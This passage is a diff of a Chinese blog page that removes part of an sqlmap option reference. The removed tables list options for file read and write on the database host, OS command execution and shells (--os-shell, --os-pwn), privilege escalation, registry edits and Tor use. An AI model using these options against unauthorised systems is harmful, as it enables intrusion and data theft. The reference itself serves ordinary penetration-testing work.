-<td>检查存在共同列</td>
-</tr>
-</tbody>
-</table>
-<p>  User-defined function injection（用户自定义函数注入）：</p>
-<pre><code>这些选项可以用来创建用户自定义函数。 
-</code></pre><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>--udf-inject</code></td>
-<td>注入用户自定义函数</td>
-</tr>
-<tr>
-<td><code>--shared-lib=SHLIB</code></td>
-<td>共享库的本地路径</td>
-</tr>
-</tbody>
-</table>
-<h2 id="File_system_access（访问文件系统）">File system access（访问文件系统）</h2><pre><code>这些选项可以被用来访问后端数据库管理系统的底层文件系统。 
-</code></pre><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>--file-read=RFILE</code></td>
-<td>从后端的数据库管理系统文件系统读取文件</td>
-</tr>
-<tr>
-<td><code>--file-write=WFILE</code></td>
-<td>编辑后端的数据库管理系统文件系统上的本地文件</td>
-</tr>
-<tr>
-<td><code>--file-dest=DFILE</code></td>
-<td>后端的数据库管理系统写入文件的绝对路径</td>
-</tr>
-</tbody>
-</table>
-<h2 id="Operating_system_access（操作系统访问）">Operating system access（操作系统访问）</h2><pre><code>这些选项可以用于访问后端数据库管理系统的底层操作系统。 
-</code></pre><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>--os-cmd=OSCMD</code></td>
-<td>执行操作系统命令 </td>
-</tr>
-<tr>
-<td><code>--os-shell</code></td>
-<td>交互式的操作系统的shell </td>
-</tr>
-<tr>
-<td><code>--os-pwn</code></td>
-<td>获取一个OOB shell，meterpreter或VNC </td>
-</tr>
-<tr>
-<td><code>--os-smbrelay</code></td>
-<td>一键获取一个OOB shell，meterpreter或VNC </td>
-</tr>
-<tr>
-<td><code>--os-bof</code></td>
-<td>存储过程缓冲区溢出利用 </td>
-</tr>
-<tr>
-<td><code>--priv-esc</code></td>
-<td>数据库进程用户权限提升 </td>
-</tr>
-<tr>
-<td><code>--msf-path=MSFPATH</code></td>
-<td>Metasploit Framework本地的安装路径 </td>
-</tr>
-<tr>
-<td><code>--tmp-path=TMPPATH</code></td>
-<td>远程临时文件目录的绝对路径 </td>
-</tr>
-</tbody>
-</table>
-<h2 id="Windows注册表访问">Windows注册表访问</h2><pre><code>这些选项可以被用来访问后端数据库管理系统Windows注册表。 
-</code></pre><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>--reg-read</code></td>
-<td>读一个Windows注册表项值</td>
-</tr>
-<tr>
-<td><code>--reg-add</code></td>
-<td>写一个Windows注册表项值数据</td>
-</tr>
-<tr>
-<td><code>--reg-del</code></td>
-<td>删除Windows注册表键值</td>
-</tr>
-<tr>
-<td><code>--reg-key=REGKEY</code></td>
-<td>Windows注册表键</td>
-</tr>
-<tr>
-<td><code>--reg-value=REGVAL</code></td>
-<td>Windows注册表项值</td>
-</tr>
-<tr>
-<td><code>--reg-data=REGDATA</code></td>
-<td>Windows注册表键值数据</td>
-</tr>
-<tr>
-<td><code>--reg-type=REGTYPE</code></td>
-<td>Windows注册表项值类型</td>
-</tr>
-</tbody>
-</table>
-<h2 id="General（一般）">General（一般）</h2><pre><code>这些选项可以用来设置一些一般的工作参数。 
-</code></pre><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>-t TRAFFICFILE</code></td>
-<td>记录所有HTTP流量到一个文本文件中 </td>
-</tr>
-<tr>
-<td><code>-s SESSIONFILE</code></td>
-<td>保存和恢复检索会话文件的所有数据 </td>
-</tr>
-<tr>
-<td><code>--flush-session</code></td>
-<td>刷新当前目标的会话文件 </td>
-</tr>
-<tr>
-<td><code>--fresh-queries</code></td>
-<td>忽略在会话文件中存储的查询结果 </td>
-</tr>
-<tr>
-<td><code>--eta</code></td>
-<td>显示每个输出的预计到达时间 </td>
-</tr>
-<tr>
-<td><code>--update</code></td>
-<td>更新SqlMap </td>
-</tr>
-<tr>
-<td><code>--save</code></td>
-<td>file保存选项到INI配置文件 </td>
-</tr>
-<tr>
-<td><code>--batch</code></td>
-<td>从不询问用户输入，使用所有默认配置。 </td>
-</tr>
-</tbody>
-</table>
-<h2 id="Miscellaneous（杂项）">Miscellaneous（杂项）</h2><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>--beep</code></td>
-<td>发现SQL注入时提醒</td>
-</tr>
-<tr>
-<td><code>--check-payload</code></td>
-<td>IDS对注入payloads的检测测试</td>
-</tr>
-<tr>
-<td><code>--cleanup</code></td>
-<td>SqlMap具体的UDF和表清理DBMS</td>
-</tr>
-<tr>
-<td><code>--forms</code></td>
-<td>对目标URL的解析和测试形式</td>
-</tr>
-<tr>
-<td><code>--gpage=GOOGLEPAGE</code></td>
-<td>从指定的页码使用谷歌dork结果</td>
-</tr>
-<tr>
-<td><code>--page-rank</code></td>
-<td>Google dork结果显示网页排名（PR）</td>
-</tr>
-<tr>
-<td><code>--parse-errors</code></td>
-<td>从响应页面解析数据库管理系统的错误消息</td>
-</tr>
-<tr>
-<td><code>--replicate</code></td>
-<td>复制转储的数据到一个sqlite3数据库</td>
-</tr>
-<tr>
-<td><code>--tor</code></td>
-<td>使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址</td>
-</tr>
-<tr>
-<td><code>--wizard</code></td>
-<td>给初级用户的简单向导界面</td>
-</tr>
-</tbody>
-</table>
-</span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1996,7 +1553,7 @@ mysql&gt;delete <span class="keyword">from</span> mysql.<span class="keyword">us
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">44</span>
+              <span class="site-state-item-count">45</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -2010,7 +1567,7 @@ mysql&gt;delete <span class="keyword">from</span> mysql.<span class="keyword">us
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">36</span>
+              <span class="site-state-item-count">37</span>
               <span class="site-state-item-name">标签</span>
               </a>
           </div>
@@ -2073,7 +1630,7 @@ mysql&gt;delete <span class="keyword">from</span> mysql.<span class="keyword">us
       <div class="footer-inner"> <div class="copyright" >
   
   &copy; &nbsp; 
-  <span itemprop="copyrightYear">2015</span>
+  <span itemprop="copyrightYear">2016</span>
   <span class="with-love">
     <i class="icon-next-heart"></i>
   </span>
